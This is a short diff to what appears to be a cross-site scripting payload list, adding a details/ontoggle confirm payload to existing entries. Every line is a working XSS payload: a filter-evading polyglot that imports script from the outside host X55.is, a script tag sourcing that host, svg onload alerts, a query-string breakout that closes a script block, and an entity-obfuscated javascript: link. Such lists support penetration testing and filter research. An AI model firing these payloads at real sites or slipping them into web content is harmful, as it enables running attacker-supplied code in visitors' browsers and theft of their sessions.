@@ -1,5 +1,6 @@
 JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\http://X55.is/.source))}//\76-->
 'Src="//X55.is/>?<Script/K='
+%22%3E%3CdeTAiLs/open/oNtoGGle=confirm(/XSS/)%3E
 ?msg=%3Csvg%2Fonload%3Dalert%28%22XSS%22%29%20%3E, <svg/onload=alert("XSS") >
 ?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
 <a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *>
